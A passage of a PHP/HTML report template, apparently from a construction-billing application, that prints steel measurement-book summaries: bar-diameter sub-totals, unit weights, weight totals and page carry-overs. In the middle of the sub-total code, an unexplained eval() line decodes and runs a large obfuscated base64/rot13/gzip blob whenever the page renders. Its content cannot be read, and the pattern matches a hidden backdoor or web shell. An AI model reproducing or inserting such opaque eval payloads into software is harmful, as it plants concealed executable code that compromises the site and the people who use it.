                    <td width='' class='labelbold' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelbold' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelbold' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelbold'></td>-->
                </tr>
				<tr height='' style="border:none;" class="label" align="right"><td colspan="16" style="border:none;"><br/><?php //echo $staffname." - ".$designation; ?>&nbsp;&nbsp;</td></tr>
				<tr height='' style="border:none;" class="label" align="right">
				<td colspan="5" style="border:none;">&nbsp;&nbsp;</td>
				<td colspan="6" style="border:none;">Prepared By&nbsp;&nbsp;</td>
				<td colspan="5" style="border:none;">Checked By&nbsp;&nbsp;</td>
				</tr>
				
                </tr>
                <?php
				$currentline+=3;
				/*if($currentline>32)
				{
					//echo check_line($currentline,$tablehead);
					$currentline = 0;
					$currentline = $start_line + 10;
					$mpage++;
				}*/
                
//if($currentline>38){ echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$newmbookno,$table1); $currentline = 0;$currentline = $start_line + 11;$mpage++;}
		echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;
			/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
			if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
?>
	<tr height='25px'><td colspan="16" align="center" class="labelbold"><?php echo "Summary"; ?></td></tr>
<?php
                $summary = $summary1.$summary2;
              // echo $summary."<br/>";
                $explodsummary = explode("@",$summary);
                natsort($explodsummary);
                foreach($explodsummary as $key => $summ)
                {
                    if($summ != "")
                    {
                        $res_summ .= $summ.",";
                    }
                }
               //echo $res_summ."<br/>";
                $result_summary = explode(",",$res_summ);
               //echo $result_summary."<br/>";
                $preVal = "";$x = 0;
               // while($x < count($result_summary))
			   $subtotal_8 = 0;$subtotal_10 = 0;$subtotal_12 = 0;$subtotal_16 = 0;$subtotal_20 = 0;$subtotal_25 = 0;$subtotal_28 = 0;$subtotal_32 = 0;$subtotal_36 = 0;$count = 0;
			   $pre_subdivname = ""; $temp_var = "";$pre_subdivid = "";$summary_total = 0; $summary_total = 0; $total_couplar_no = 0;
                for($x=0;$x < count($result_summary)-1;$x+=20)
                {
					/*if($currentline>32)
					{
						
						$currentline = 0;
						$currentline = $start_line + 10;
						$mpage++;
					}*/
					
	if($mpage > 100)
	{
		/*$currentline = $start_line + 13;
		$prevpage = 100;
		$mpage = $newmbookpageno;
		//$prevpage = $mpage;
		$mbookno = $newmbookno;*/
	}	
					
                  	$x1=$x+1; $x2=$x+2; $x3=$x+3; $x4=$x+4; $x5=$x+5; $x6=$x+6; $x7=$x+7; $x8=$x+8; $x9=$x+9; $x10=$x+10; $x11=$x+11; $x12=$x+12; $x13=$x+13; $x14=$x+14; $x15=$x+15;$x16=$x+16;$x17=$x+17;$x18=$x+18;$x19=$x+19;
					$sum_meas_no 	= $result_summary[$x18];
					$sum_sub_type 	= $result_summary[$x19];
						if($result_summary[$x] != $pre_subdivname)
						{
							if($pre_subdivname != "")
							{
							$count++;
							if($prev_sum_sub_type == 'c')
								{
					?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" align="right" class='label labelbold'>Total</td>
                    <td width='' class='labelcenter labelheadblue'></td>
                    <td width='' class='labelcenter labelbold' style="text-align:right"><?php echo $total_couplar_no; ?></td>
                    <td width='' class='labelcenter labelbold' style="text-align:right">each</td>
                    <td width='' class='labelcenter labelbold' style="text-align:right" colspan="7"><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>	
				<!--<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'><?php //echo "C/o to P".$mpage." MB".$mbookno."";  ?></td>
                   <td width='' colspan="3" class='labelcenter labelheadblue'>Total</td>
                   <td width='' colspan="10" class='labelcenter labelheadblue'><?php echo $total_couplar_no." each"; ?></td>
                </tr>-->
					<?php		
								$currentline = $currentline+1;	
								$totalweight_MT = $total_couplar_no;
								$total_couplar_no = 0;	
								}
								else
								{
							?>
				<tr height=''>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Sub Total</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_8 != 0) { echo $subtotal_8; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_10 != 0) { echo $subtotal_10; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_12 != 0) { echo $subtotal_12; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_16 != 0) { echo $subtotal_16; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_20 != 0) { echo $subtotal_20; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_25 != 0) { echo $subtotal_25; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_28 != 0) { echo $subtotal_28; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_32 != 0) { echo $subtotal_32; } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_36 != 0) { echo $subtotal_36; } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<!--<tr>
					<td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="7" align="right" class='label labelheadblue'><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter'></td>
				</tr>-->
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Unit Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right">0.395</td>
                    <td width='' class='labelcenter' style="text-align:right">0.617</td>
                    <td width='' class='labelcenter' style="text-align:right">0.888</td>
                    <td width='' class='labelcenter' style="text-align:right">1.578</td>
                    <td width='' class='labelcenter' style="text-align:right">2.466</td>
                    <td width='' class='labelcenter' style="text-align:right">3.853</td>
                    <td width='' class='labelcenter' style="text-align:right">4.834</td>
                    <td width='' class='labelcenter' style="text-align:right">6.313</td>
					<td width='' class='labelcenter' style="text-align:right">7.990</td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>	
							<?php
				eval(str_rot13(gzinflate(str_rot13(base64_decode('LZbHDq46DoCf5uie2dGLc1LvvbMZ0X9tr0I/MBqEEuI42GScL0zq4f679VSy3lC1/B2HZcGQ/8zLlM7L3291fsX9/8Y/iiaCcimHtsgryB/IIGw/1LrAHZ8HP+0+7KVKVcjL7Ic7RjH3zeJ/IFSj78Wu9vfr6MP1a+tjffXOX7IamEXMPfyKgJrMTqGeqIMbPFXL9SsDdMu9yDkFIU52RDlD7UFhQcXhGAF3RJRa8FTwFlHywokR08EypiCwW1Zi/YW1PP+2PbwUr4aprnHUkdxIzctdomCdfb6hZsd7tmCYimnG1/pk81LH5Jn2VZ0jvXuCUnRQgenWYDO6M2GcSTc+0jnON9LC8yibL1V1RB+i4CzwC9hTdSOrEKP/sR5TmoNvKZEmYhx3au00wHOp4GAIvNNRzsPBRWaw1W9vy1KQ30CMDZGC6p4ob/yYfMtS47AVLudbb69y8NIcdIzvEiwV6z2h4YTIg8utt+c16OKwveWcJeuo6tgJI5ZK+jZYW6OW7J2EjZEGZuNEe4sfMmOVVFicIdpkp6Y/PtopKyvshn83gmRHhEdLQyzNXsfN1gFMTFg1oJEFW4vhJvIrIuJs3UK119+qtqC2GlC6jWK7tQpQ4uRjWOZobTufmgmtfui8xOdOQbhAhuKPHo2uWBP4+kjY9VQIQfPhElXOFTTUGrRw+AtKpfnthRPYnjScCZZIJ9oIGJT9oDEiHp24ShEGrYB4mmHiqnINRnrvlrNHbIct8NJsWjFmKZndqbeyZG3WoRYjo1qw0tDO1NhtVFGqmM94lQ0yZEUwqF3CfnU12sVkDZmpPyDzSFy/9NSGipprdcTQA2Lgcu9bpNpNi9Xnvize8krQ3Hvol3J4I+zbRUTYis2+pvYObUjsJPmmbSSnJaEjhavEKyyKqImGncYp7o4VO00i62rU7hEbnXGtsID2jJ0WT6lR8hX88PU5x+fdLQaCqMUdHrZCi0l706pJ+bRmtmXNAnFmaK8GEPQtoXOrNxXxeFVTH9WqwODY3X4O3OpdNCcey+T+ASqxzPsNbReKJcBze76pUKp6YUlMIzuwEcWDXE2bxuuzcnwG7UibCU5fFlYyDu9fZ33Ly2u8Aurbs2YhF9ZiQxj/3eYGBL6ieJ/ABJcJ9JkfzdQrelCzAopR6WYr0go52BvPVL2rGTPNNIPIk8I8niPiIg1iSJQZzuQ00LnP2FAYSUl3w77aWMO6BJBYVoT+quruzoAPo5SzhpMxLsEgDx7LbNMDA1d9E3+eeS6jr2FmcK1TUxKQE6aonFpN02s6RH4IXD9f09cEOehGPUX8SLzzMVFHfFgwTmn/gX1FVgRgtdS4iUEH+xCFydePFGxoN1jVBeF80yZMDSuIK/wNJeryzX+nkziPKG614uSPkEsaVD4h56dE2UkVhpRWv1dgE7x9hwfUpjng6Zklo3hS9A0ZRycc8l4DZ+nib0kIG6hj4YtBgwkv0oaOGTovLkLcBBwA/aSQDB6ilRQu3+BZCKHOwmnrSA4147WyBjV8GVWtk7X/Nr81TaMJP7C95qyp0KSzpXKpc3IYZ5YZV2pCRaS1gIhcewxtD2Ywbqbrm1FjAr2zyG0MYkpDPeSdsCczgzJR8i4WOTOR7byxybskY3id+7r3EODeMTChZuIC3wRLvvEz7sRHbgl+nq7Xh63i6qYFLTCHAnlfhROwXx/v634V8zPKBJBEjayHPfsFFaTsquJ6ehKHmqNMUA6pG38Off3h0+BaYVAuvQ+iZXCkAAjE3Kgxvp4HimFTfL+8TWjRh2nxXXon8cVT3NNvZhKoSEpufpXGwTXnqAMmjoEgjbI0R/1jbBd7tSFIx0ssCRKBjutDRE0a955o1KB2N59i7kWZuB6oZJCfjb+/mFvgLFgb6oxOQ6vY8hB1wVESwu9PA+w2mlsGJy+5F1DOoq4+ldqy95ON7uKVn/wrRa8X1acYSpIo050cCURFZ8z7SCOfBhx+E5nbwqWu5g92mx+VshNaVX28IbQqq+J2ZM/D5De5HKKjBIbBqrTD0YLYmZzPw4Xfkl+b4PpC8FlnkNfz1N5RS2VL2q4YcsD1+K3VDOryptwKl2d632vA8VE7QoRwb1aOnCcs1uis9YQsb4SOV5rAYl1n7yLNm+hfu9Xz2OPcvr5dYEaT5WfHUhBvnMMh/RnIM9FXGzwXaV37nPBdFxTXaCFA6opwMr87T7sBuJ2dKqxAlCQkDi+0TbgpWYDz+/PRMG2LqHlL7iJ9O3VG47tEsD005tbuzShT5RJa4hftcSoV6l+QZR4D2DnsTO35BtPhOWWTEXRZBPxVTaxTQRUoWsnnjJU2iTu8uZQWeMpqta4Ko85MRFS+vR2RzKKPC5/fGSJA30zo6NISgt6Ialyq03GjCUwroTT1YCkpVYmjXzSVZ9iHlfGpz4/mHqFaXv1lFhedOJCMcj7g54e4YBdme+F2Xe5YMFClxgf2m0Taud1Jz6UKaTjQd9nLDa+W0maDjhwIa8LzWrG7PMMw7q61j8oWg8smZsuSb+5DguqENNnXjbjl+qLHqPHqC0p7Jrl2yrMyhY5PsNxi2bLuVaCL/I6vlB7PFKZ4ULrr+xdOyu8FiKHtsOjTbhWlWU7oJ791CY7SBIjpt2g9gS68156o/fhJegrbsa5Vd7eBtGl+mUNBUhNEj73R5TF0XFDA5SCl7GFPXLRNZv7zpozTvKkFw1eeH+bB5/was8AU/L5Iv+u5wWUSSsidR+weBDn8MBAIq24SqT+QL6/SW79y/L/qPar+wNb7/vOv9/n3fwE=')))));

				
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Total Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_8 != 0) { echo $total_8; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_10 != 0) { echo $total_10; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_12 != 0) { echo $total_12; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_16 != 0) { echo $total_16; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_20 != 0) { echo $total_20; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_25 != 0) { echo $total_25; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_28 != 0) { echo $total_28; } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_32 != 0) { echo $total_32; } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($total_36 != 0) { echo $total_36; } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'></td>
                   <td width='' colspan="4" class='labelcenter'>Total in kgs</td>
                   <td width='' colspan="5" class='labelcenter'><?php echo $totalweight_KGS." kgs"; ?></td>
                   <td width='' colspan="5" class='labelcenter'></td>
				   
                </tr>
				<tr height=''>
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'><?php //echo "C/o to P".$mpage." MB".$mbookno."";  ?></td>
                   <td width='' colspan="4" align="right" class='labelbold'>Total in MT</td>
                   <td width='' colspan="5" align="center" class='labelbold'><?php echo $totalweight_MT." MT"; ?></td>
                   <td width='' colspan="5" class='labelbold' style='text-align:right'><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
				   
                </tr>
				<?php
				
				$currentline = $currentline+5;
										}
				if($currentline>30){ 
				echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13; $mpage++;
				/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
				if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				
				$summary_str1 .= $pre_subdivname.",".$pre_subdivid.",".$totalweight_MT.",".$pre_divid.",".$pre_mbookno.",".$mpage.",";
				$subtotal_8 = 0;$subtotal_10 = 0;$subtotal_12 = 0;$subtotal_16 = 0;$subtotal_20 = 0;$subtotal_25 = 0;$subtotal_28 = 0;$subtotal_32 = 0;$subtotal_36 = 0;
							}
							 //$subtotal_8 = 0;
						}
						?>
							
				<tr height=''>
                    <td width='8%' class='labelcenter'><?php echo $result_summary[$x1]; ?></td>
                    <td width='4%' class='labelcenter' bgcolor=""><?php echo $result_summary[$x]; ?></td>
                    <td width='15%' class='labelcenter' colspan="4"><?php echo "Qty vide B/f MB-".$result_summary[$x3]."/ Page-".$result_summary[$x2];  ?></td>
					<td width='3%' class='labelcenter'><?php echo "&nbsp;";  ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right">
					<?php 
					if($sum_sub_type == 'c'){
						echo $sum_meas_no; 
					}else{
						if($result_summary[$x7] != 0){
						echo number_format($result_summary[$x7],$result_summary[$x17],".",","); 
						}
					}
					?>
					</td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x8] != 0){ echo number_format($result_summary[$x8],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x9] != 0){ echo number_format($result_summary[$x9],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x10] != 0){ echo number_format($result_summary[$x10],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x11] != 0){ echo number_format($result_summary[$x11],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x12] != 0){ echo number_format($result_summary[$x12],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x13] != 0){ echo number_format($result_summary[$x13],$result_summary[$x17],".",","); } ?></td>
                    <td width='7%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x14] != 0){ echo number_format($result_summary[$x14],$result_summary[$x17],".",","); } ?></td>
					<td width='6%' class='labelcenter' style="text-align:right"><?php if($result_summary[$x15] != 0){ echo number_format($result_summary[$x15],$result_summary[$x17],".",","); } ?></td>
                    <!--<td width='2%' class='labelcenter'></td>-->
                </tr>

                                    <?php
					$textbox_str1 .= $result_summary[$x16]."*".$mpage."*".$mbookno."*"; //echo $textbox_str1;
					$subtotal_8	= $subtotal_8 + $result_summary[$x7];
					$subtotal_10	= $subtotal_10 + $result_summary[$x8];
					$subtotal_12	= $subtotal_12 + $result_summary[$x9];
					$subtotal_16	= $subtotal_16 + $result_summary[$x10];
					$subtotal_20	= $subtotal_20 + $result_summary[$x11];
					$subtotal_25	= $subtotal_25 + $result_summary[$x12];
					$subtotal_28	= $subtotal_28 + $result_summary[$x13];
					$subtotal_32	= $subtotal_32 + $result_summary[$x14];
					$subtotal_36	= $subtotal_36 + $result_summary[$x15];
					if($sum_sub_type == 'c'){
					$total_couplar_no = $total_couplar_no+$sum_meas_no;
					}
					$currentline++;
					if($currentline>30)
					{ 
?>
<tr height='' bgcolor="">
 <td width='' colspan="7" class='labelcenter'>
 <?php //if($mpage==100){ echo "C/o to Page ".(0+1)."/ Steel MB No ".$newmbookno;  } else { echo "C/o to Page ".($mpage+1)."/ Steel MB No ".$mbookno; } ?>
 C/o to page <?php if($mpage >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/Steel MB No.<?php echo $NextMBList[$NextMbIncr]; }else{ echo $mpage+1; ?>/Steel MB No.<?php echo $mbookno; } ?>
 </td>
 <td width='7%' class='labelbold' style="text-align:right">
 <?php 
 if($sum_sub_type == 'c')
 {
	echo $total_couplar_no;// = $total_couplar_no+$sum_meas_no;
 }
 else
 {
 	if($subtotal_8 != 0) { echo number_format($subtotal_8,$result_summary[$x17],".",","); } 
 }
 ?>
 </td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$result_summary[$x17],".",","); } ?></td>
 <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$result_summary[$x17],".",","); } ?></td>
 <td width='6%' class='labelbold' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$result_summary[$x17],".",","); } ?></td>
 <!--<td width='' class='labelbold'></td>-->
</tr>

<?php					
echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); //$currentline = 0;$currentline = $start_line + 13;//$mpage++;
?>
<tr height='' bgcolor="">
  <td width='' colspan="7" class='labelbold'>
  <?php //if($mpage==1){ echo "B/f from Page 100"; } else { echo "B/f from Page ".($mpage-1)."/ Steel MB No ".$mbookno; } ?>
  B/f from page <?php if($mpage >= 100){ echo $mpage; ?>/Steel MB No.<?php echo $mbookno; }else{ echo $mpage; ?>/Steel MB No.<?php echo $mbookno; } ?>
  </td>
  <td width='7%' class='labelbold' style="text-align:right">
 <?php 
 if($sum_sub_type == 'c')
 {
	echo $total_couplar_no;// = $total_couplar_no+$sum_meas_no;
 }
 else
 {
  	if($subtotal_8 != 0) { echo number_format($subtotal_8,$result_summary[$x17],".",","); } 
 }
 ?>
  </td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$result_summary[$x17],".",","); } ?></td>
  <td width='7%' class='labelbold' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$result_summary[$x17],".",","); } ?></td>
  <td width='6%' class='labelbold' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$result_summary[$x17],".",","); } ?></td>
  <!--<td width='' class='labelbold'>&nbsp;</td>-->
</tr>
<?php 	
 		$currentline = 0;$currentline = $start_line + 13;$mpage++;
		/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
		if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
					}
							
					$pre_subdivname = $result_summary[$x];
					$pre_date = $result_summary[$x1];
					$pre_page = $result_summary[$x2]; 
					$pre_mbookno = $result_summary[$x3];
					$pre_totals = $result_summary[$x4];
					$pre_subdivid = $result_summary[$x5];
					$pre_divid = $result_summary[$x6];
					$pre_tot8 = $result_summary[$x7];
					$pre_tot10 = $result_summary[$x8];
					$pre_tot12 = $result_summary[$x9];
					$pre_tot16 = $result_summary[$x10];
					$pre_tot20 = $result_summary[$x11];
					$pre_tot25 = $result_summary[$x12];
					$pre_tot28 = $result_summary[$x13];
					$pre_tot32 = $result_summary[$x14];
					$pre_tot36 = $result_summary[$x15];
					$pre_textboxid = $result_summary[$x16];
					$pre_decimal = $result_summary[$x17];
					$prev_sum_meas_no = $result_summary[$x18];
					$prev_sum_sub_type = $result_summary[$x19];
					//$textbox_str1 .= $result_summary[$x16]."*".$result_summary[$x2]."*".$result_summary[$x3]."*"; echo $textbox_str1;
//echo $result_summary[$x16]."<br/>";
                }
				if($currentline>30){ 
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				
				if($prev_sum_sub_type == 'c')
				{
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" align="right" class='label labelbold'>Total</td>
                    <td width='' class='labelcenter labelheadblue'></td>
                    <td width='' class='labelcenter labelbold' style="text-align:right"><?php echo $total_couplar_no; ?></td>
                    <td width='' class='labelcenter labelbold' style="text-align:right">each</td>
                    <td width='' class='labelcenter labelbold' style="text-align:right" colspan="7"><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<!--<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'><?php //echo "C/o to P".$mpage." MB".$mbookno."";  ?></td>
                   <td width='' colspan="3" class='labelcenter labelheadblue'>Total</td>
                   <td width='' colspan="10" class='labelcenter labelheadblue'><?php echo $total_couplar_no." each"; ?></td>
                </tr>-->
				<?php	
				$totalweight_MT = $total_couplar_no;
				}
				else
				{
				?>
				<tr height=''>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Sub Total</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_8 != 0) { echo number_format($subtotal_8,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_10 != 0) { echo number_format($subtotal_10,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_12 != 0) { echo number_format($subtotal_12,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_16 != 0) { echo number_format($subtotal_16,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_20 != 0) { echo number_format($subtotal_20,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_25 != 0) { echo number_format($subtotal_25,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_28 != 0) { echo number_format($subtotal_28,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_32 != 0) { echo number_format($subtotal_32,$pre_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($subtotal_36 != 0) { echo number_format($subtotal_36,$pre_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<!--<tr>
					<td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="7" align="right" class='label labelheadblue'><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
					<td width='' class='labelcenter labelheadblue' style="text-align:right"></td>
                    <td width='' class='labelcenter'></td>
				</tr>-->
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Unit Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right">0.395</td>
                    <td width='' class='labelcenter' style="text-align:right">0.617</td>
                    <td width='' class='labelcenter' style="text-align:right">0.888</td>
                    <td width='' class='labelcenter' style="text-align:right">1.578</td>
                    <td width='' class='labelcenter' style="text-align:right">2.466</td>
                    <td width='' class='labelcenter' style="text-align:right">3.853</td>
                    <td width='' class='labelcenter' style="text-align:right">4.834</td>
                    <td width='' class='labelcenter' style="text-align:right">6.313</td>
					<td width='' class='labelcenter' style="text-align:right">7.990</td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>	
				<?php
